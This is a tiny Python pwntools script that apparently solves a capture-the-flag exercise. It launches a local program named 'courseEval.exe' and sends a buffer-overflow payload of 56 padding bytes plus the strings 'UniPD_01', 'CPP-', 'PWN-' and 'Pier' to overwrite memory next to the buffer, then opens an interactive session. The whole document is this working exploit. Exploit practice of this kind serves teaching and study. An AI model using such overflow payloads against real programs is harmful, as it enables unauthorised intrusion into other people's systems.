from pwn import *

garbage=b"A" * 56 + b"UniPD_01" + b"CPP-" + b"PWN-" + b"Pier"
p=process('./courseEval.exe')
p.sendline(garbage)
p.interactive()